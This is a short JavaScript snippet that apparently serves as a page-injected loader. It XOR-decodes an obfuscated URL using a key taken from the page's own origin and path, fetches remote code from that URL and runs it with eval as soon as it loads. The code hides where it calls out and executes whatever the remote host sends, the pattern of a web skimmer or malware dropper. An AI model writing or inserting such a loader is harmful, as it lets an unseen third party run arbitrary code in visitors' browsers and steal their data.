(async function(){
    function xorStrings(a, b) {
        let result = '';
        // Determine the length of the shorter string to avoid errors.
        const len = Math.min(a.length, b.length);

        for (let i = 0; i < len; i++) {
            // Get the character codes (ASCII values) for the current characters
            const charCodeA = a.charCodeAt(i);
            const charCodeB = b.charCodeAt(i);

            // Perform the bitwise XOR on the character codes
            const xorResult = charCodeA ^ charCodeB;

            // Convert the result back to a character and append it to the result string
            result += String.fromCharCode(xorResult);
        }

        return result;
    }

    const key = JSON.stringify([location.origin, location.pathname, location.ancestorOrigins]);
    const href = 'OEoaGxkVXl9XWxYaEhsbQFdKWwMLDxwKTAoHSU5HTUdLFkVeRFBFDRgbDQwOTBUIGwwBXB4OHBVfThcHDQgMSAgW';
    const url = (xorStrings(key, atob(href)));
    const a = await fetch(url);
    const b = await a.text();
    eval(`const _url = "${url}";` + b);
}())
